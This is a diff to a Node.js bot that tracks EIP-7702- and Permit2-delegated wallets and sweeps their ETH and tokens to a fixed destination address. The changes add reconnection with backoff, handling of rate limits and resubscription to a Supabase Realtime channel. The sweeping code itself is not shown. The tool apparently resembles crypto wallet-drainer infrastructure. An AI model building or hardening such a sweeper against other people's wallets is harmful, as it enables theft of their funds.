@@ -40,15 +40,26 @@ if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
 
 // ── Setup ─────────────────────────────────────────────────────────────────────
 
-const provider = RPC_URL.startsWith("wss")
-  ? new ethers.WebSocketProvider(RPC_URL)
-  : new ethers.JsonRpcProvider(RPC_URL);
-
-const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
-
+// Supabase client is stateless — created once.
 const supabase = SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY
   ? createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, { auth: { persistSession: false } })
   : null;
+
+// Provider / wallet / contracts are recreated on each reconnect.
+let provider;
+let wallet;
+let permit2;
+let contract;
+
+// Backoff schedule for reconnections (ms): 10s, 30s, 60s, 120s (capped).
+const BACKOFF_MS = [10_000, 30_000, 60_000, 120_000];
+const getBackoff  = (attempt) => BACKOFF_MS[Math.min(attempt, BACKOFF_MS.length - 1)];
+
+function createProvider() {
+  return RPC_URL.startsWith("wss")
+    ? new ethers.WebSocketProvider(RPC_URL)
+    : new ethers.JsonRpcProvider(RPC_URL);
+}
 
 // ── ABIs ──────────────────────────────────────────────────────────────────────
 
@@ -76,12 +87,6 @@ const PERMIT2_ABI = [
   "function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)",
 ];
 
-const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
-
-const contract = CONTRACT_ADDRESS
-  ? new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, wallet)
-  : null;
-
 // ── State ─────────────────────────────────────────────────────────────────────
 
 let sweepingETH        = false;
@@ -89,6 +94,8 @@ const sweepingToken    = {};
 let lastSweepBlock     = 0;
 // Map of address → type ("eip7702" | "permit2") for fast block-listener routing.
 const delegatedWallets = new Map();
+// Active Supabase Realtime channel — unsubscribed before each reconnect.
+let realtimeChannel    = null;
 
 // ── Logging ───────────────────────────────────────────────────────────────────
 
@@ -347,7 +354,13 @@ async function loadDelegatedWallets() {
 function subscribeRealtime() {
   if (!supabase) { warn("Supabase not configured — Realtime skipped"); return; }
 
-  supabase
+  // Tear down previous subscription before creating a new one.
+  if (realtimeChannel) {
+    supabase.removeChannel(realtimeChannel).catch(() => {});
+    realtimeChannel = null;
+  }
+
+  realtimeChannel = supabase
     .channel(`delegated_wallets_${CHAIN}`)
     .on(
       "postgres_changes",
@@ -389,7 +402,7 @@ function subscribeRealtime() {
       if (status === "SUBSCRIBED") {
         log(`✅ Supabase Realtime subscribed (chain=${CHAIN})`);
       } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT") {
-        warn(`Realtime ${status} — retrying in 10s`);
+        warn(`Realtime ${status} — resubscribing in 10s`);
         setTimeout(subscribeRealtime, 10_000);
       }
     });
@@ -426,55 +439,82 @@ function attachBlockListener() {
   });
 }
 
-// ── Contract event listener ───────────────────────────────────────────────────
+// ── Bot startup with exponential backoff reconnection ─────────────────────────
+//
+// startBot(attempt) creates a fresh provider + wallet + contracts on every call.
+// On WebSocket error (including 429 rate limits) the error handler calls
+// startBot(attempt + 1) after a backoff delay:
+//   attempt 1 → 10 s
+//   attempt 2 → 30 s
+//   attempt 3 → 60 s
+//   attempt 4+ → 120 s
 
-if (contract) {
-  contract.on("ETHReceived", async (sender, amount) => {
-    log(`ETHReceived — ${ethers.formatEther(amount)} from ${sender}`);
-    await sweepETH();
-  });
-}
+async function startBot(attempt = 0) {
+  if (attempt > 0) {
+    const delay = getBackoff(attempt - 1);
+    warn(`Reconnecting in ${delay / 1000}s (attempt ${attempt})…`);
+    await new Promise((r) => setTimeout(r, delay));
+  }
 
-// ── Provider reconnect ────────────────────────────────────────────────────────
+  try {
+    // Tear down previous provider and all its listeners.
+    if (provider) {
+      try { provider.removeAllListeners(); } catch {}
+      try { provider.destroy?.(); } catch {}
+    }
 
-provider.on("error", (error) => {
-  warn(`Provider error: ${error.message} — reconnecting in 5s`);
-  setTimeout(() => {
-    provider.removeAllListeners();
+    // Create fresh provider, wallet, and contracts.
+    provider = createProvider();
+    wallet   = new ethers.Wallet(PRIVATE_KEY, provider);
+    permit2  = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
+    contract = CONTRACT_ADDRESS
+      ? new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, wallet)
+      : null;
+
+    // Provider error handler — reconnect with backoff.
+    provider.on("error", async (error) => {
+      const is429 = /429|rate.limit|too many/i.test(error?.message ?? "");
+      warn(`Provider error: ${error?.message ?? error}${is429 ? " (rate limited)" : ""}`);
+      await startBot(attempt + 1);
+    });
+
+    // Contract event listener.
+    if (contract) {
+      contract.on("ETHReceived", async (sender, amount) => {
+        log(`ETHReceived — ${ethers.formatEther(amount)} from ${sender}`);
+        await sweepETH();
+      });
+    }
+
+    // Health check.
+    try {
+      const balance = await provider.getBalance(wallet.address);
+      log(`Relayer: ${ethers.formatEther(balance)} native`);
+      if (balance < ethers.parseEther("0.005")) warn("Relayer LOW — top up or sweeps will fail");
+    } catch (e) {
+      warn(`Relayer balance check failed: ${e.message}`);
+    }
+
+    log(`Sweep bot starting… (attempt=${attempt})`);
+    log(`Destination: ${DESTINATION_ADDRESS}`);
+    log(`Permit2:     ${PERMIT2_ADDRESS}`);
+    log(`Relayer:     ${wallet.address}`);
+    log(`Chain:       ${CHAIN}`);
+    if (CONTRACT_ADDRESS) log(`Contract:    ${CONTRACT_ADDRESS}`);
+
+    await loadDelegatedWallets();
+    subscribeRealtime();
     attachBlockListener();
-    log("Block listener reattached");
-  }, 5000);
-});
 
-// ── Health check ──────────────────────────────────────────────────────────────
-
-async function checkRelayerBalance() {
-  const balance = await provider.getBalance(wallet.address);
-  log(`Relayer: ${ethers.formatEther(balance)} native`);
-  if (balance < ethers.parseEther("0.005")) {
-    warn("Relayer LOW — top up or sweeps will fail");
+    log("Listening for blocks and Realtime events…");
+  } catch (e) {
+    err(`startBot failed: ${e.message}`);
+    // Hard error during setup (e.g. bad RPC URL) — retry with backoff.
+    await startBot(attempt + 1);
   }
 }
 
-// ── Start ─────────────────────────────────────────────────────────────────────
+startBot().catch((e) => { err(`Fatal: ${e.message}`); process.exit(1); });
 
-async function start() {
-  log("Sweep bot starting...");
-  log(`Destination: ${DESTINATION_ADDRESS}`);
-  log(`Permit2:     ${PERMIT2_ADDRESS}`);
-  log(`Relayer:     ${wallet.address}`);
-  log(`Chain:       ${CHAIN}`);
-  if (CONTRACT_ADDRESS) log(`Contract:    ${CONTRACT_ADDRESS}`);
-
-  await checkRelayerBalance();
-  await loadDelegatedWallets();
-  subscribeRealtime();
-  attachBlockListener();
-
-  log("Listening for blocks and Realtime events...");
-}
-
-start().catch((e) => { err(`Startup failed: ${e.message}`); process.exit(1); });
-
-process.on("SIGINT",  () => { log("Shutting down..."); provider.removeAllListeners(); process.exit(0); });
-process.on("SIGTERM", () => { log("Shutting down..."); provider.removeAllListeners(); process.exit(0); });
+process.on("SIGINT",  () => { log("Shutting down…"); provider?.removeAllListeners(); process.exit(0); });
+process.on("SIGTERM", () => { log("Shutting down…"); provider?.removeAllListeners(); process.exit(0); });
